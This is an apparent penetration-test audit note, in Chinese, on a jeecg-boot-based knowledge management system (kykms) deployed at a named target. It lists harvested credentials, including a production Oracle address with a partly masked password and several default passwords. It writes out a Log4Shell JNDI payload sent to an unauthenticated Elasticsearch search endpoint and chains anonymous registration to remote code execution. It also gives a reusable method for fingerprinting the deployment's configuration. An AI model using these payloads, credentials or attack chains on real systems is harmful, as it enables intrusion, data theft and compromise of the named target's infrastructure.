# kykms 路9 案例（部署配置+凭据挖掘）—— 实证与推演模板

> 来源：kykms（Github mahonelau/-kykms @8f130c2d，jeecg-boot 2.4.5 fork）白盒审计路9。目标 zsk.example.edu。完整报告：`D:\tools\audit\kykms\audit\route9-deploy-secrets.md`

## 凭据清单（打码）
- Oracle 生产：`jeecg-boot-module-system/src/main/resources/application-prod.yml:79-81` `jdbc:oracle:thin:@106.52.244.12:1521:GHYZSK` / ZSK / `GHYzsk_1********`（CONFIRMED）
- MySQL：deploy prod `:112-114` localhost:3306/km root/root；docker `application-docker.yml:18-21` kykms-mysql-comm root/root；compose env `MYSQL_ROOT_PASSWORD=root` + `MYSQL_ROOT_HOST='%'`
- Redis：docker 形态 `password: 123456`（application-docker.yml:32）；deploy 形态 `''` 空口令（:127）
- ES：`elasticsearch.yml:83 xpack.security.enabled: false` + `:56 network.host: 0.0.0.0`；app 侧 `master-auth: false`（docker）或空密码（repo prod）
- 默认口令：druid admin/123456（全环境）、knife4j basic jeecg/jeecg1314（全环境）、actuator `exposure.include: metrics,httptrace`（base 合并全 profile）
- 占位符判定：OSS `accessKey/secretKey: ??`、SMTP `password: ??`、MinIO `??`——4 环境逐字节相同 → 模板占位符非脱敏

## ES 7.6.1 Log4Shell 触发路径（实证）
- ES 7.6.1 → log4j-core 2.11.1 <2.15 → CVE-2021-44228 命中（修复线 7.16.2/7.10.2）
- 路径 A：compose `9200:9200+9300:9300` 映射宿主机 + 无认证 → 匿名直连 `POST /_search` body `{"query":{"query_string":{"query":"${jndi:ldap://x:1389/a}"}}}` → ES WARN "Failed to parse query [..]" 含原文 → JNDI RCE；9300 可伪节点入簇
- 路径 B（需 JWT）：`/KM/kmDoc/searchDoc`(POST)/`advanceSearchDoc`(GET) → `KmDocServiceImpl.searchESKmDoc:839` → title/content/keywords 进 ES 查询 DSL（EsUtils.java:59-188）→ `restHighLevelClient.search`（:1022-1056）；同步 `_analyze`（KmSearchRecordServiceImpl.java:76）；搜索记录写 `log_km_search_record_YYYYMM` 索引（keywordsMax keyword 字段，超长触发 MapperParsingException 日志含原值）
- 路径 C（需登录）：上传文档 Tika 全文 → `saveDocToEs`（KmDocServiceImpl.java:489）→ ES 索引错误日志含字段原值
- app 自身 logback（`log.debug(hit.getSourceAsString())` :1065）不中招；匿名前置：`/sys/user/register` anon（ShiroConfig.java:93）→ 注册即触达

## excludeUrls 四版本对比（结论）
| 端点 | V1 deploy-prod | V2 base | V3 dev | V4 repo-prod | zsk 实测 |
|---|---|---|---|---|---|
| /sys/category/** | ✅ | ❌ | ✅ | ❌ | ✅ |
| /sys/dictItem/** | ✅ | ❌ | ✅ | ❌ | ✅ |
| /KM/kmSysConfig/querySiteInfo | ❌ | ✅ | ✅ | ❌ | ❌ 被拦 |
| /test/jeecgDemo/*,/visual/**,/map/**,/jmreport/bigscreen2/** | ❌ | ❌ | ❌ | ✅ | — |
| /KM/kmDoc/{uploadDoc,downloadKmDoc,previewKmDoc,changePreviewFile},/KM/kmDoc/new/**,/km/kmKnowledgeMap/notoken/** | ❌ | ❌ | ❌ | ❌ | ✅ 放行 |

- test/docker profile 未定义 excludeUrls → 继承 base（profile 合并）
- zsk 指纹 ≈ V1（sys/category、dictItem 放行 + querySiteInfo 拦）+ 手动追加 kmDoc 条目 + jar 版本漂移（`new/*`、KmKnowledgeMap 在快照代码中不存在）

## 漂移推演方法（可复用）
实测放行/拦截集 × 各版本配置交叉匹配 → 定位部署方基线版本（V1-like）；实测有而全版本无 → 手动加配；代码中不存在 → jar 版本比快照新。输出"手动加配项清单"（条目存在=HIGH，来源= SUSPECTED）并串联匿名→RCE 全链。

## 复用注意
- kykms 两套形态：docker（MySQL root/root + ES localhost）vs zsk 生产（外部 Oracle 106.52.244.12）——凭据归属按 `deploy/` 与 `module resources/` 两份 application-prod.yml 区分
- JwtUtil 在 jeecg-boot-common 2.4.5 依赖 jar 中（快照无 pom/jar）→ 密钥标"需反编译确认"，旁证：/sys/getEncryptedString 默认 AES key 存活 → 部署未改默认
